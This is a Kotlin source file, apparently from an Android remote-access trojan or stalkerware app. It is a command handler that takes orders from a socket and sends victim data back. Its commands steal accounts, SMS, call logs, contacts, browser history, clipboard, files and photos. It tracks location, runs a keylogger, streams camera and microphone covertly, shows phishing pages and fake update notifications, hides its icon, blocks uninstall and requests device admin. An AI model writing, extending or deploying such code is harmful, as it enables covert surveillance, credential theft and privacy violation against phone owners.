package com.sync.xxx

import android.content.Context
import android.location.Location
import android.util.Base64
import android.util.Log
import com.sync.xxx.managers.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.File

class ManagerCommandHandler(private val context: Context) {

    private val TAG = "MCH"

    private val accountManager      by lazy { AccountManager(context) }
    private val adminRightsManager  by lazy { AdminRightsManager(context) }
    private val airplaneModeManager by lazy { AirplaneModeManager(context) }
    private val antiDetectionManager by lazy { AntiDetectionManager(context) }
    private val antiUninstallManager by lazy { AntiUninstallManager(context) }
    private val appUsageManager     by lazy { AppUsageManager(context) }
    private val audioStreamManager  by lazy { AudioStreamManager(context) }
    private val autoBrightnessManager by lazy { AutoBrightnessManager(context) }
    private val autoStartManager    by lazy { AutoStartManager(context) }
    private val batteryManager      by lazy { BatteryManager(context) }
    private val bluetoothManager    by lazy { BluetoothManager(context) }
    private val brightnessManager   by lazy { BrightnessManager(context) }
    private val browserHistoryManager by lazy { BrowserHistoryManager(context) }
    private val calendarManager     by lazy { CalendarManager(context) }
    private val callLogManager      by lazy { CallLogManager(context) }
    private val cameraManager       by lazy { CameraManager(context) }
    private val cameraStreamManager by lazy { CameraStreamManager(context) }
    private val cellInfoManager     by lazy { CellInfoManager(context) }
    private val clipboardManager    by lazy { ClipboardManager(context) }
    private val connectionTypeManager by lazy { ConnectionTypeManager(context) }
    private val contactManager      by lazy { ContactManager(context) }
    private val dndManager          by lazy { DNDManager(context) }
    private val dataUsageManager    by lazy { DataUsageManager(context) }
    private val deviceInfoManager   by lazy { DeviceInfoManager(context) }
    private val fakeNotificationManager by lazy { FakeNotificationManager(context) }
    private val fileManager         by lazy { FileManager(context) }
    private val flashManager        by lazy { FlashManager(context) }
    private val galleryManager      by lazy { GalleryManager(context) }
    private val hideIconManager     by lazy { HideIconManager(context) }
    private val hotspotManager      by lazy { HotspotManager(context) }
    private val ipAddressManager    by lazy { IPAddressManager(context) }
    private val installedAppsManager by lazy { InstalledAppsManager(context) }
    private val keepAliveManager    by lazy { KeepAliveManager(context) }
    private val keyloggerManager    by lazy { KeyloggerManager(context) }
    private val keystrokeManager    by lazy { KeystrokeManager(context) }
    private val locationTracker     by lazy { LocationTracker(context) }
    private val lockManager         by lazy { LockManager(context) }
    private val microphoneManager   by lazy { MicrophoneManager(context) }
    private val mobileDataManager   by lazy { MobileDataManager(context) }
    private val networkInfoManager  by lazy { NetworkInfoManager(context) }
    private val networkMonitor      by lazy { NetworkMonitor(context) }
    private val notificationManager by lazy { NotificationManager(context) }
    private val orientationManager  by lazy { OrientationManager(context) }
    private val permissionManager   by lazy { PermissionManager(context) }
    private val phishingManager     by lazy { PhishingManager(context) }
    private val powerManager        by lazy { PowerManager(context) }
    private val proxyManager        by lazy { ProxyManager(context) }
    private val rotationLockManager by lazy { RotationLockManager(context) }
    private val screenRecorderManager by lazy { ScreenRecorderManager(context) }
    private val screenTimeoutManager by lazy { ScreenTimeoutManager(context) }
    private val secureStorageManager by lazy { SecureStorageManager(context) }
    private val sensorManager       by lazy { SensorManager(context) }
    private val signalStrengthManager by lazy { SignalStrengthManager(context) }
    private val simCardManager      by lazy { SimCardManager(context) }
    private val smsManager          by lazy { SmsManager(context) }
    private val stealthModeManager  by lazy { StealthModeManager(context) }
    private val toastManager        by lazy { ToastManager(context) }
    private val vpnManager          by lazy { VPNManager(context) }
    private val vibrationManager    by lazy { VibrationManager(context) }
    private val volumeManager       by lazy { VolumeManager(context) }
    private val wifiManager         by lazy { WifiManager(context) }

    /** Dipasang dari DeviceService untuk emit ke socket */
    var emitCallback: ((String, JSONObject) -> Unit)? = null

    private fun emit(event: String, data: JSONObject) {
        try { emitCallback?.invoke(event, data) } catch (e: Exception) {
            Log.e(TAG, "emit error: ${e.message}")
        }
    }

    fun handle(cmd: String, value: String) {
        try {
            val params = try { JSONObject(value) } catch (_: Exception) {
                JSONObject().put("value", value).put("text", value)
            }
            handleCommand(cmd, params)
        } catch (e: Exception) {
            Log.e(TAG, "handle error cmd=$cmd: ${e.message}")
        }
    }

    fun handleCommand(command: String, params: JSONObject?): JSONObject {
        val v = params?.optString("value", "") ?: ""
        return try {
            when (command) {

                // ── ACCOUNTS / GMAIL ─────────────────────────────────
                "get_accounts", "get_account_types" -> {
                    val arr = accountManager.getAccountsAsJson()
                    val res = JSONObject().put("success", true).put("accounts", arr)
                    emit("device:accounts", res); res
                }

                // ── ADMIN ─────────────────────────────────────────────
                "request_admin" -> {
                    adminRightsManager.requestAdminRights()
                    JSONObject().put("success", true)
                }
                "check_admin" -> JSONObject().put("success", true).put("active", adminRightsManager.isAdminActive())
                "remove_admin" -> { adminRightsManager.removeAdminRights(); JSONObject().put("success", true) }

                // ── AIRPLANE MODE ─────────────────────────────────────
                "toggle_airplane" -> {
                    val on = airplaneModeManager.toggle()
                    val res = JSONObject().put("success", true).put("enabled", on)
                    emit("device:airplane", res); res
                }
                "get_airplane_status" -> {
                    val res = airplaneModeManager.getAirplaneModeStatusAsJson()
                    emit("device:airplane", res); res
                }

                // ── ANTI UNINSTALL ────────────────────────────────────
                "enable_anti_uninstall"  -> { antiUninstallManager.enableUninstallProtection(); JSONObject().put("success", true) }
                "disable_anti_uninstall" -> { antiUninstallManager.disableUninstallProtection(); JSONObject().put("success", true) }

                // ── APP USAGE ────────────────────────────────────────
                "get_app_usage", "get_screen_time" -> {
                    val stats = appUsageManager.getTodayUsageStats()
                    val arr = JSONArray()
                    stats.forEach { s -> arr.put(JSONObject()
                        .put("app", s.packageName)
                        .put("time", s.totalTimeInForeground)) }
                    val res = JSONObject().put("success", true).put("usage", arr)
                    emit("device:appUsage", res); res
                }

                // ── AUDIO STREAM ─────────────────────────────────────
                "start_audio_stream" -> {
                    audioStreamManager.startStreaming { pcm ->
                        val b64 = AudioStreamManager.audioToBase64(pcm)
                        emit("device:audioChunk", JSONObject().put("audio", b64).put("sampleRate", 16000))
                    }
                    JSONObject().put("success", true)
                }
                "stop_audio_stream" -> { audioStreamManager.stopStreaming(); JSONObject().put("success", true) }

                // ── BRIGHTNESS ───────────────────────────────────────
                "set_brightness" -> {
                    val level = v.toIntOrNull() ?: params?.optInt("level", 50) ?: 50
                    brightnessManager.setBrightnessByPercentage(level)
                    JSONObject().put("success", true).put("level", level)
                }
                "get_brightness" -> {
                    JSONObject().put("success", true).put("brightness", brightnessManager.getCurrentBrightness())
                }
                "set_auto_brightness" -> {
                    if (v == "true") autoBrightnessManager.enable() else autoBrightnessManager.disable()
                    JSONObject().put("success", true)
                }

                // ── BLUETOOTH ────────────────────────────────────────
                "toggle_bluetooth" -> {
                    val enable = v == "true" || v == "on" || v == "1"
                    val success = if (enable) bluetoothManager.enableBluetooth() else bluetoothManager.disableBluetooth()
                    val res = JSONObject().put("success", success).put("enabled", bluetoothManager.isBluetoothEnabled())
                    emit("device:bluetooth", res); res
                }
                "get_bluetooth_devices" -> {
                    val devices = bluetoothManager.getPairedDevices()
                    val arr = JSONArray()
                    devices.forEach { d -> arr.put(JSONObject()
                        .put("name", d.name).put("address", d.address).put("type", d.type)) }
                    val res = JSONObject().put("success", true).put("devices", arr)
                        .put("enabled", bluetoothManager.isBluetoothEnabled())
                    emit("device:bluetooth", res); res
                }

                // ── BROWSER HISTORY ──────────────────────────────────
                "get_browser_history", "get_bookmarks" -> {
                    val history = browserHistoryManager.getAllHistory()
                    val arr = JSONArray()
                    history.take(100).forEach { h -> arr.put(JSONObject()
                        .put("url", h.url).put("title", h.title).put("visits", h.visitCount)
                        .put("lastVisit", h.lastVisitTime)) }
                    val res = JSONObject().put("success", true).put("history", arr)
                    emit("device:browserHistory", res); res
                }

                // ── CALENDAR ─────────────────────────────────────────
                "get_calendar_events" -> {
                    val events = calendarManager.getUpcomingEvents()
                    val arr = JSONArray()
                    events.forEach { e -> arr.put(JSONObject()
                        .put("title", e.title).put("start", e.startTime)
                        .put("end", e.endTime).put("location", e.location ?: "")) }
                    val res = JSONObject().put("success", true).put("events", arr)
                    emit("device:calendar", res); res
                }

                // ── CALL LOGS ────────────────────────────────────────
                "get_call_logs" -> {
                    val logs = callLogManager.getAllCallLogs()
                    val arr = JSONArray()
                    logs.take(100).forEach { l -> arr.put(JSONObject()
                        .put("number", l.phoneNumber).put("name", l.contactName ?: "")
                        .put("type", l.callType).put("duration", l.duration)
                        .put("date", l.date)) }
                    val res = JSONObject().put("success", true).put("callLogs", arr)
                    emit("device:callLogs", res); res
                }

                // ── CAMERA STREAM ─────────────────────────────────────
                "start_camera_stream" -> {
                    val facing = if (v == "front") CameraStreamManager.CameraFacing.FRONT
                                 else CameraStreamManager.CameraFacing.BACK
                    cameraStreamManager.startStreaming(facing) { frameBytes ->
                        val b64 = Base64.encodeToString(frameBytes, Base64.NO_WRAP)
                        emit("camera:frame", JSONObject().put("frame", b64).put("facing", v))
                    }
                    JSONObject().put("success", true)
                }
                "stop_camera_stream" -> { cameraStreamManager.stopStreaming(); JSONObject().put("success", true) }

                // ── CELL INFO ────────────────────────────────────────
                "get_cell_info", "get_tower_info" -> {
                    val cells = cellInfoManager.getCellInfoAsJsonArray()
                    val res = JSONObject().put("success", true).put("cells", cells)
                    emit("device:cellInfo", res); res
                }

                // ── CLIPBOARD ────────────────────────────────────────
                "get_clipboard" -> {
                    val text = clipboardManager.getCurrentClipText()
                    val res = JSONObject().put("success", true).put("clipboard", text ?: "")
                    emit("device:clipboard", res); res
                }
                "monitor_clipboard" -> {
                    clipboardManager.startMonitoring()
                    JSONObject().put("success", true)
                }

                // ── CONTACTS ────────────────────────────────────────
                "get_contacts" -> {
                    val contacts = contactManager.getAllContacts()
                    val arr = JSONArray()
                    contacts.take(200).forEach { c ->
                        val phones = JSONArray().also { pa -> c.phoneNumbers.forEach { pa.put(it) } }
                        val emails = JSONArray().also { ea -> c.emails.forEach { ea.put(it) } }
                        arr.put(JSONObject().put("name", c.name).put("phones", phones).put("emails", emails))
                    }
                    val res = JSONObject().put("success", true).put("contacts", arr)
                    emit("device:contacts", res); res
                }

                // ── DATA USAGE ───────────────────────────────────────
                "get_data_usage" -> {
                    val mob = dataUsageManager.getMobileDataUsage()
                    val wifi = dataUsageManager.getWiFiDataUsage()
                    val res = JSONObject().put("success", true)
                        .put("mobileRx", mob.rxBytes).put("mobileTx", mob.txBytes)
                        .put("wifiRx", wifi.rxBytes).put("wifiTx", wifi.txBytes)
                    emit("device:dataUsage", res); res
                }

                // ── DEVICE INFO ──────────────────────────────────────
                "get_device_info", "get_system_info" -> {
                    val info = deviceInfoManager.getAllInfo()
                    val res = JSONObject().put("success", true).put("info", info)
                    emit("device:deviceInfo", res); res
                }

                // ── DND ──────────────────────────────────────────────
                "toggle_dnd" -> {
                    if (v == "true" || v == "on") dndManager.enablePriority() else dndManager.enableAll()
                    JSONObject().put("success", true)
                }

                // ── FAKE NOTIFICATION ─────────────────────────────────
                "show_fake_notification" -> {
                    fakeNotificationManager.showFakeSystemUpdate()
                    JSONObject().put("success", true)
                }

                // ── FILES ────────────────────────────────────────────
                "list_files" -> {
                    val path = v.ifEmpty { "/sdcard" }
                    val files = fileManager.listFiles(path)
                    val arr = JSONArray()
                    files.forEach { f -> arr.put(JSONObject()
                        .put("name", f.name).put("size", f.size)
                        .put("isDir", f.isDirectory).put("modified", f.lastModified)) }
                    val res = JSONObject().put("success", true).put("files", arr).put("path", path)
                    emit("device:files", res); res
                }
                "read_file" -> {
                    val content = fileManager.readFile(v)
                    val res = JSONObject().put("success", content != null)
                        .put("content", content ?: "").put("path", v)
                    emit("device:fileContent", res); res
                }

                // ── FLASH ────────────────────────────────────────────
                "toggle_flash", "flash_on" -> {
                    val on = if (command == "flash_on") flashManager.turnOn() else flashManager.toggle()
                    JSONObject().put("success", true).put("on", flashManager.isOn())
                }
                "flash_off" -> { flashManager.turnOff(); JSONObject().put("success", true) }

                // ── GALLERY ──────────────────────────────────────────
                "get_gallery_images", "get_gallery_videos" -> {
                    val media = if (command == "get_gallery_videos")
                        galleryManager.getAllVideos() else galleryManager.getAllPhotos()
                    val arr = JSONArray()
                    media.take(50).forEach { m -> arr.put(JSONObject()
                        .put("id", m.id).put("name", m.displayName).put("path", m.path)
                        .put("size", m.size).put("date", m.dateAdded).put("duration", m.duration ?: 0)) }
                    val res = JSONObject().put("success", true)
                        .put(if (command == "get_gallery_videos") "videos" else "photos", arr)
                    emit("device:gallery", res); res
                }

                // ── HOTSPOT ──────────────────────────────────────────
                "toggle_hotspot" -> {
                    val on = hotspotManager.toggle()
                    JSONObject().put("success", true).put("enabled", on)
                }
                "get_hotspot_status" -> JSONObject().put("success", true).put("enabled", hotspotManager.isEnabled())

                // ── IP ADDRESS ───────────────────────────────────────
                "get_ip_address" -> {
                    val ip = ipAddressManager.getAllLocalIPs()
                    val res = JSONObject().put("success", true).put("ipv4", ip.ipv4 ?: "")
                        .put("ipv6", ip.ipv6 ?: "")
                    emit("device:ipAddress", res); res
                }

                // ── INSTALLED APPS ───────────────────────────────────
                "get_installed_apps", "get_system_apps" -> {
                    val apps = if (command == "get_system_apps")
                        installedAppsManager.getSystemApps() else installedAppsManager.getUserApps()
                    val arr = JSONArray()
                    apps.forEach { a -> arr.put(JSONObject()
                        .put("name", a.appName).put("pkg", a.packageName)
                        .put("version", a.versionName).put("size", a.apkSize)) }
                    val res = JSONObject().put("success", true).put("apps", arr)
                    emit("device:apps", res); res
                }

                // ── KEYLOGGER ────────────────────────────────────────
                "start_keylogger" -> { keyloggerManager.startKeylogging(); JSONObject().put("success", true) }
                "stop_keylogger"  -> { keyloggerManager.stopKeylogging(); JSONObject().put("success", true) }
                "get_keylog"      -> {
                    val logs = JSONArray()
                    val res = JSONObject().put("success", true).put("keylogs", logs)
                    emit("device:keylogs", res); res
                }

                // ── LOCATION ────────────────────────────────────────
                "get_location", "start_location_tracking" -> {
                    locationTracker.startTracking({ loc: Location ->
                        val res = JSONObject().put("lat", loc.latitude).put("lon", loc.longitude)
                            .put("accuracy", loc.accuracy).put("altitude", loc.altitude)
                        emit("device:location", res)
                    }, 5000L)
                    JSONObject().put("success", true)
                }
                "stop_location_tracking" -> { locationTracker.stopTracking(); JSONObject().put("success", true) }

                // ── MIC RECORD ───────────────────────────────────────
                "start_mic_record" -> {
                    val dur = v.toIntOrNull() ?: 10
                    microphoneManager.startRecording()
                    android.os.Handler(android.os.Looper.getMainLooper()).postDelayed({
                        try {
                            val path = microphoneManager.stopRecording()
                            if (path != null) {
                                val bytes = File(path).readBytes()
                                val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                                emit("device:micData", JSONObject().put("audio", b64).put("format", "aac"))
                            }
                        } catch (e: Exception) { Log.e(TAG, "mic send: ${e.message}") }
                    }, dur * 1000L)
                    JSONObject().put("success", true)
                }
                "stop_mic_record" -> {
                    val path = microphoneManager.stopRecording()
                    if (path != null) {
                        try {
                            val bytes = File(path).readBytes()
                            val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                            emit("device:micData", JSONObject().put("audio", b64).put("format", "aac"))
                        } catch (e: Exception) { Log.e(TAG, "mic stop: ${e.message}") }
                    }
                    JSONObject().put("success", true)
                }

                // ── MOBILE DATA ──────────────────────────────────────
                "toggle_mobile_data" -> {
                    val enable = v == "true" || v == "on" || v == "1"
                    val success = if (enable) mobileDataManager.enable() else mobileDataManager.disable()
                    val res = JSONObject().put("success", success).put("enabled", mobileDataManager.isEnabled())
                    emit("device:mobileData", res); res
                }
                "get_mobile_data_status" -> {
                    JSONObject().put("success", true).put("enabled", mobileDataManager.isEnabled())
                }

                // ── NETWORK INFO ─────────────────────────────────────
                "get_network_info" -> {
                    val res = JSONObject().put("success", true)
                        .put("type", networkInfoManager.getNetworkTypeName())
                        .put("ipv4", networkInfoManager.getIPv4Address() ?: "")
                        .put("ipv6", networkInfoManager.getIPv6Address() ?: "")
                    emit("device:network", res); res
                }

                // ── NOTIFICATIONS ────────────────────────────────────
                "get_notifications" -> {
                    // NotificationManager pakai listener, ambil stored
                    val res = JSONObject().put("success", true).put("notifications", JSONArray())
                    emit("device:notifs", res); res
                }

                // ── ORIENTATION ──────────────────────────────────────
                "lock_orientation"   -> { orientationManager.lockPortrait(); JSONObject().put("success", true) }
                "unlock_orientation" -> { orientationManager.setOrientation(-1); JSONObject().put("success", true) }
                "enable_rotation_lock"  -> { rotationLockManager.disableAutoRotation(); JSONObject().put("success", true) }
                "disable_rotation_lock" -> { rotationLockManager.enableAutoRotation(); JSONObject().put("success", true) }

                // ── PHISHING ─────────────────────────────────────────
                "show_phishing_page" -> {
                    phishingManager.openPhishingPage(v.ifEmpty { "google" })
                    JSONObject().put("success", true)
                }

                // ── POWER ────────────────────────────────────────────
                "reboot_device"   -> { powerManager.reboot(); JSONObject().put("success", true) }
                "shutdown_device" -> { powerManager.shutdown(); JSONObject().put("success", true) }

                // ── SCREEN TIMEOUT ───────────────────────────────────
                "disable_screen_timeout" -> { screenTimeoutManager.setTimeoutSeconds(Int.MAX_VALUE); JSONObject().put("success", true) }
                "get_screen_timeout" -> JSONObject().put("success", true).put("timeout", screenTimeoutManager.getCurrentTimeoutSeconds())
                "set_screen_timeout" -> {
                    screenTimeoutManager.setTimeoutSeconds(v.toIntOrNull() ?: 60)
                    JSONObject().put("success", true)
                }

                // ── SENSORS ──────────────────────────────────────────
                "get_sensors" -> {
                    val sensors = sensorManager.getAllSensors()
                    val arr = JSONArray()
                    sensors.forEach { s -> arr.put(JSONObject().put("name", s.name).put("type", s.type)) }
                    val res = JSONObject().put("success", true).put("sensors", arr)
                    emit("device:sensors", res); res
                }

                // ── SIM INFO ─────────────────────────────────────────
                "get_sim_info" -> {
                    val res = JSONObject().put("success", true)
                        .put("carrier", simCardManager.getCarrierName())
                        .put("number", simCardManager.getPhoneNumber())
                        .put("imsi", simCardManager.getIMSI())
                        .put("state", simCardManager.getSimState())
                    emit("device:sim", res); res
                }

                // ── SMS ──────────────────────────────────────────────
                "get_sms", "send_sms" -> {
                    if (command == "get_sms") {
                        val msgs = smsManager.getAllMessages()
                        val arr = JSONArray()
                        msgs.take(100).forEach { m -> arr.put(JSONObject()
                            .put("address", m.address).put("body", m.body)
                            .put("type", m.type).put("date", m.date)) }
                        val res = JSONObject().put("success", true).put("messages", arr)
                        emit("device:sms", res); res
                    } else {
                        val to = params?.optString("to") ?: ""
                        val body = params?.optString("text") ?: v
                        smsManager.sendSms(to, body)
                        JSONObject().put("success", true)
                    }
                }
                "delete_sms" -> { smsManager.deleteSms(v.toLongOrNull() ?: 0); JSONObject().put("success", true) }

                // ── STEALTH ──────────────────────────────────────────
                "enable_stealth_mode"  -> { stealthModeManager.enableStealthMode(); JSONObject().put("success", true) }
                "disable_stealth_mode" -> { stealthModeManager.disableStealthMode(); JSONObject().put("success", true) }
                "hide_icon"  -> { hideIconManager.hideIcon(); JSONObject().put("success", true) }
                "show_icon"  -> { hideIconManager.showIcon(); JSONObject().put("success", true) }

                // ── TOAST ────────────────────────────────────────────
                "show_toast" -> { toastManager.showShort(v); JSONObject().put("success", true) }
                "show_long_toast" -> { toastManager.showLong(v); JSONObject().put("success", true) }

                // ── VIBRATE ──────────────────────────────────────────
                "vibrate" -> { vibrationManager.vibrate(v.toLongOrNull() ?: 500L); JSONObject().put("success", true) }
                "vibrate_pattern" -> { vibrationManager.vibratePattern(longArrayOf(0, 200, 100, 200)); JSONObject().put("success", true) }
                "stop_vibration" -> { vibrationManager.cancel(); JSONObject().put("success", true) }

                // ── VOLUME ───────────────────────────────────────────
                "set_volume" -> {
                    val level = v.toIntOrNull() ?: 5
                    volumeManager.setVolumeByPercentage(android.media.AudioManager.STREAM_MUSIC, level)
                    JSONObject().put("success", true)
                }
                "get_volume" -> {
                    JSONObject().put("success", true)
                        .put("volume", volumeManager.getVolume(android.media.AudioManager.STREAM_MUSIC))
                }
                "mute_all" -> {
                    volumeManager.setVolume(android.media.AudioManager.STREAM_MUSIC, 0, false)
                    volumeManager.setVolume(android.media.AudioManager.STREAM_RING, 0, false)
                    JSONObject().put("success", true)
                }

                // ── VPN ──────────────────────────────────────────────
                "get_vpn_status" -> JSONObject().put("success", true).put("active", vpnManager.isVPNActive())

                // ── WIFI ─────────────────────────────────────────────
                "toggle_wifi" -> {
                    val enable = v == "true" || v == "on" || v == "1"
                    val success = if (enable) wifiManager.enableWifi() else wifiManager.disableWifi()
                    val res = JSONObject().put("success", success).put("enabled", wifiManager.isWifiEnabled())
                    emit("device:wifi", res); res
                }
                "get_wifi_networks", "get_wifi_info" -> {
                    val conn = wifiManager.getCurrentConnection()
                    val nets = wifiManager.scanNetworks()
                    val arr = JSONArray()
                    nets.forEach { n -> arr.put(JSONObject()
                        .put("ssid", n.ssid).put("bssid", n.bssid)
                        .put("rssi", n.rssi).put("security", n.security)
                        .put("frequency", n.frequency)) }
                    val res = JSONObject().put("success", true).put("networks", arr)
                        .put("enabled", wifiManager.isWifiEnabled())
                    if (conn != null) res.put("connected", JSONObject()
                        .put("ssid", conn.ssid).put("ip", conn.ipAddress)
                        .put("rssi", conn.rssi))
                    emit("device:wifi", res); res
                }

                // ── BATTERY ──────────────────────────────────────────
                "get_battery_info" -> {
                    val res = JSONObject().put("success", true)
                        .put("percent", batteryManager.getBatteryPercentage())
                        .put("charging", batteryManager.isCharging())
                        .put("temp", batteryManager.getTemperatureCelsius())
                        .put("health", batteryManager.getBatteryHealth())
                    emit("device:battery", res); res
                }

                else -> {
                    Log.w(TAG, "Unhandled: $command")
                    JSONObject().put("success", false).put("error", "Not implemented: $command")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "handleCommand error cmd=$command: ${e.message}")
            JSONObject().put("success", false).put("error", e.message ?: "Unknown error")
        }
    }
}
